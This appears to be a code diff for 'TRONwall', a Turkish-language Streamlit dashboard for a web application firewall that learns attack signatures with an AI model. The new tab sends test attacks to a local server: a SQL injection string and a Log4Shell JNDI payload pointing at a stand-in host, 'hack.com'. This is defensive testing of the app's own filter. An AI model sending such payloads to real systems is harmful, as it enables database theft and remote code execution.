@@ -8,7 +8,7 @@ import subprocess
 from datetime import datetime
 import html 
 import sys
-
+import requests 
 
 
 current_dir = os.path.dirname(os.path.abspath(__file__))
@@ -185,7 +185,7 @@ def manage_attacker_ip(action, ip="66.66.66.66"):
 
 
 # --- BAŞLIK VE SIDEBAR ---
-st.title("🛡️ TRONwall: Otonom Güvenlik Komuta Merkezi")
+st.title("🛡️ TRONwall: Otonom Güvenlik Komuta Merkezi 🛡️")
 
 st.sidebar.header("Sistem Durumu")
 cpu = psutil.cpu_percent()
@@ -201,7 +201,7 @@ if st.sidebar.button(" SİSTEMİ SIFIRLA"):
     st.rerun()
 
 # --- SEKMELİ YAPI ---
-tab1, tab2, tab3, tab4= st.tabs(["📊 İzleme Paneli", "🎮 Kontrol Merkezi", "🧪 Saldırı Laboratuvarı", "🧠 HAFIZA" ])
+tab1, tab2, tab3, tab4= st.tabs(["İzleme Paneli", "Kontrol Merkezi", "Saldırı Laboratuvarı", "HAFIZA" ])
 
 # 1. SEKME: İZLEME PANELİ
 with tab1:
@@ -261,7 +261,7 @@ with tab1:
                 safe_payload = f"<br><span style='font-size:0.8em; opacity:0.8; margin-left: 10px;'>📦 <b>Payload:</b> {escaped}</span>"
 
             # Log detay metnini hazırla
-            log_details = f"<b>[{method}]</b> {timestamp} | 👤 {ip} | 🌐 {html.escape(str(url))}"
+            log_details = f"<b>[{method}]</b> {timestamp} |  {ip} |  {html.escape(str(url))}"
             
             # --- 3 AŞAMALI DURUM KONTROLÜ (HİZALAMA DÜZELTİLDİ) ---
             
@@ -279,7 +279,7 @@ with tab1:
                 st.markdown(f"""
                 <div class='log-entry' style='border-left: 5px solid #FFA500; background: rgba(100, 60, 0, 0.4); color: #FFD700;'>
                     <span style='background-color: #FFA500; color: black; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.8em;'>⚠️ SALDIRI (İZİN VERİLDİ)</span>
-                    <br><span style='margin-left: 5px;'>🔓 {log_details}</span>
+                    <br><span style='margin-left: 5px;'> {log_details}</span>
                     {safe_payload}
                 </div>""", unsafe_allow_html=True)
             
@@ -288,13 +288,13 @@ with tab1:
                 st.markdown(f"""
                 <div class='log-entry' style='border-left: 5px solid #00ff00; color: #ccffcc;'>
                     <span style='background-color: #006600; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.8em;'>✅ NORMAL</span>
-                    <br><span style='margin-left: 5px;'>✔ {log_details}</span>
+                    <br><span style='margin-left: 5px;'> {log_details}</span>
                     {safe_payload}
                 </div>""", unsafe_allow_html=True)
             
             else:
                 # Gri (Bilinmeyen durum)
-                st.markdown(f"<div class='log-entry' style='border-left: 5px solid #888;'>📡 {log_details}</div>", unsafe_allow_html=True)
+                st.markdown(f"<div class='log-entry' style='border-left: 5px solid #888;'> {log_details}</div>", unsafe_allow_html=True)
 
     # --- AI & RAG İÇ GÖRÜLERİ ---
     st.divider()
@@ -359,7 +359,7 @@ with tab3:
     
     # --- SENARYO 1: YEŞİL (NORMAL) ---
     with col_green:
-        st.markdown("### ✅ Senaryo 1: Temiz")
+        st.markdown("###  Senaryo 1: Temiz")
         st.info("Normal kullanıcı trafiği simüle edilir.")
         
         if st.button("▶ BAŞLAT (Yeşil Log)", use_container_width=True):
@@ -370,7 +370,7 @@ with tab3:
             
     # --- SENARYO 2: TURUNCU (SIZINTI) ---
     with col_orange:
-        st.markdown("### ⚠️ Senaryo 2: Sızma")
+        st.markdown("###  Senaryo 2: Sızma")
         st.warning("Saldırı yapılır ama IP yasaklanmaz.")
         
         if st.button("▶ BAŞLAT", use_container_width=True):
@@ -383,7 +383,7 @@ with tab3:
             
     # --- SENARYO 3: KIRMIZI (ENGEL) ---
     with col_red:
-        st.markdown("### 🛡️ Senaryo 3: Savunma")
+        st.markdown("###  Senaryo 3: Savunma")
         st.error("Saldırı yapılır ve WAF engeller.")
         
         if st.button("▶ BAŞLAT (Kırmızı Log)", type="primary", use_container_width=True):
@@ -402,101 +402,100 @@ with tab3:
         stop_simulation("force_attack.py")
 
 
-# --- 4. SEKME: GERÇEK RAG & AI ENTEGRASYONU ---
-with tab4:
-    st.subheader("🧠 TRONwall Sinir Ağı (Neural Network)")
 
-    # Sınıfları Başlat (Senin yazdığın __init__ fonksiyonları çalışır)
+# --- TAB 4: RAG & AI DÖNGÜSÜ ---
+with tab4:
+    st.subheader(" TRONwall Sinir Ağı (Canlı Öğrenme Döngüsü)")
+    st.markdown("Bilinmeyen bir saldırıyı gönderin, AI ile analiz edin ve sisteme öğretin.")
+
+    # Sınıfları Başlat
     try:
-        kb = KnowledgeBase()       # retriever.py
-        learner = AutoLearner()    # learner.py
-        wm = WhitelistManager()    # whitelist_manager.py
-    except Exception as e:
-        st.error(f"Sınıflar başlatılamadı: {e}")
+        kb = KnowledgeBase()
+        learner = AutoLearner()
+        wm = WhitelistManager()
+    except:
+        st.error("Sınıflar yüklenemedi.")
         st.stop()
 
-    # --- ÜST KISIM: WHITELIST YÖNETİMİ ---
-    with st.expander("🏳️ Whitelist Yönetimi", expanded=False):
-        c1, c2 = st.columns([2, 1])
-        with c1:
-            st.dataframe(pd.DataFrame(wm.data["allowed_ips"], columns=["İzin Verilen IP'ler"]), use_container_width=True)
-        with c2:
-            st.dataframe(pd.DataFrame(wm.data["allowed_paths"], columns=["Güvenli Yollar"]), use_container_width=True)
-            
-            # Yeni IP Ekleme Testi
-            new_ip = st.text_input("Whitelist'e IP Ekle:")
-            if st.button("Ekle (+)") and new_ip:
-                wm.add_ip(new_ip)
-                st.success(f"{new_ip} eklendi! (Dosyaya yazıldı)")
-                time.sleep(1)
-                st.rerun()
+    # İki Kolon: Sol (Saldırı Testi) - Sağ (AI Operasyonu)
+    col_test, col_ai = st.columns(2)
 
-    col_rag, col_learn = st.columns(2)
-
-    # --- SOL KOLON: RETRIEVER (GERÇEK ARAMA) ---
-    with col_rag:
-        st.markdown("### RAG Retriever (Bilgi Bankası)")
-
+    # --- SOL: SALDIRI SİMÜLATÖRÜ ---
+    with col_test:
+        st.info("1. Adım: Canlı Saldırı Gönder")
         
-        # Kullanıcıdan log satırı al
-        log_input = st.text_area("Analiz Edilecek Log Satırı:", 
-                                value="GET /users.php?id=1 UNION SELECT * FROM users",
-                                height=100)
-        
-        if st.button("Hafızada Ara (Search)"):
-            # SENİN KODUN ÇALIŞIYOR:
-            results = kb.search_knowledge(log_input)
-            
-            if results:
-                st.success(f" TEHDİT BULUNDU! ({len(results)} eşleşme)")
-                for match in results:
-                    st.json(match) # Senin kodunun döndürdüğü dict yapısını gösterir
-            else:
-                st.info(" Temiz. Hafızada eşleşen bir saldırı imzası yok.")
-
-    # --- SAĞ KOLON: LEARNER (GERÇEK ÖĞRENME) ---
-    with col_learn:
-        st.markdown("### AI Learner (Öğrenme Modülü)")
-        
-        st.info("Senaryo: Retriever'ın bulamadığı yeni bir saldırı (Zero-Day) geldi.")
-        
-        new_attack_type = st.text_input("Saldırı Adı (AI Tespiti):", value="Log4Shell RCE")
-        new_pattern = st.text_input("Saldırı Deseni (Regex/String):", value="${jndi:ldap}")
-        
-        if st.button("Bunu Hafızaya Kaydet (Learn)"):
-            status = st.status("AI İşlemi Başlatıldı...", expanded=True)
-            
+        # Test 1: Bilinen Saldırı
+        if st.button(" Bilinen Saldırı Gönder (SQLi)"):
             try:
-                # 1. Simüle Edilmiş LLM Analizi (llm_client kodun olmadığı için)
-                status.write(" Gemini AI ile analiz yapılıyor...")
-                time.sleep(1.5)
-                status.write("AI Kararı: Bu pattern KRİTİK seviyede tehlikeli.")
+                # Veritabanında zaten var olan bir saldırı
+                payload = "UNION SELECT * FROM users"
+                url = f"http://127.0.0.1:5000/search?q={payload}"
+                r = requests.get(url)
                 
-                # 2. SENİN KODUN ÇALIŞIYOR (Dosyaya Yazma):
-                status.write("Learner çalıştırılıyor...")
-                
-                # Gerçek kayıt işlemi
-                result = learner.learn_new_attack(new_attack_type, new_pattern, risk_level="CRITICAL")
-                
-                if result:
-                    status.update(label=" Başarıyla Öğrenildi!", state="complete")
-                    st.success(f"Yeni ID Atandı: **{result.get('id')}**")
-                    st.json(result) # Kaydedilen veriyi göster
-                    
-                    # Konfeti
-                    st.balloons()
+                if r.status_code == 403:
+                    st.success(f"✅ ENGELENDİ (403)! RAG Çalışıyor.\nPayload: {payload}")
                 else:
-                    status.update(label=" Kayıt Başarısız (Mükerrer olabilir)", state="error")
-                    st.warning("Bu desen zaten veritabanında var.")
-                    
+                    st.warning(f"⚠️ GEÇTİ ({r.status_code}) - Sunucu bu imzayı tanımadı!")
             except Exception as e:
-                st.error(f"Learner Hatası: {e}")
+                st.error(f"Bağlantı Hatası: {e}")
+
+        st.divider()
+
+        # Test 2: Bilinmeyen Saldırı (Zero-Day)
+        st.write("**Zero-Day Testi (Önce Geçmeli, Öğrenince Kalmalı)**")
+        # Buraya henüz veritabanında OLMAYAN bir kod yaz
+        unknown_payload = st.text_input("Saldırı Kodu:", value="${jndi:ldap://hack.com}")
+        
+        if st.button(" Bilinmeyen Saldırıyı Gönder"):
+            try:
+                url = f"http://127.0.0.1:5000/login?user={unknown_payload}"
+                r = requests.get(url)
+                
+                if r.status_code == 200:
+                    st.warning("SALDIRI BAŞARILI! (Sistem bunu tanımıyor)")
+                    st.caption("Loglarda 'ALLOWED' ve 'Sarı/Turuncu' görmelisiniz.")
+                elif r.status_code == 403:
+                    st.success(" ENGELLENDİ! Sistem bunu zaten biliyor.")
+            except Exception as e:
+                st.error(f"Hata: {e}")
+
+    # --- SAĞ: AI ÖĞRENME MERKEZİ ---
+    with col_ai:
+        st.info(" 2. Adım: AI Analizi ve Öğretme")
+        
+        st.markdown(f"**Analiz Edilecek:** `{unknown_payload}`")
+        
+        if st.button("Gemini AI'a Sor"):
+            status = st.status("Analiz yapılıyor...", expanded=True)
+            try:
+                # 1. LLM Analizi (Gerçek)
+                status.write("Gemini'ye bağlanılıyor...")
+                ai_response_str = llm_client.ask_gemini(unknown_payload)
+                ai_response = json.loads(ai_response_str)
+                
+                status.write(f"Sonuç: {ai_response.get('type')}")
+                st.json(ai_response)
+                
+                # 2. Kaydetme Butonu (İç içe)
+                if ai_response.get("is_malicious"):
+                    if st.button("BU BİLGİYİ RAG'A KAYDET"):
+                        res = learner.learn_new_attack(
+                            ai_response.get("type"), 
+                            unknown_payload, 
+                            ai_response.get("risk_level")
+                        )
+                        if res:
+                            st.success(f"Öğrenildi! Yeni ID: {res['id']}")
+                            st.balloons()
+                            st.info(" Şimdi soldaki 'Bilinmeyen Saldırıyı Gönder' butonuna tekrar bas!")
+                        else:
+                            st.error("Kaydedilemedi.")
+            except Exception as e:
+                status.write("Hata oluştu.")
+                st.error(str(e))
 
     st.divider()
-    
-    # Veritabanı Önizleme
-    with st.expander("Tüm RAG Veritabanını Gör "):
-        st.json(kb.data) # KnowledgeBase içindeki self.data'yı döker
-# Otomatik Yenileme
+    with st.expander(" Güncel RAG Veritabanı (attack_signatures.json)"):
+        st.json(kb.data)
 time.sleep(2)
 st.rerun()
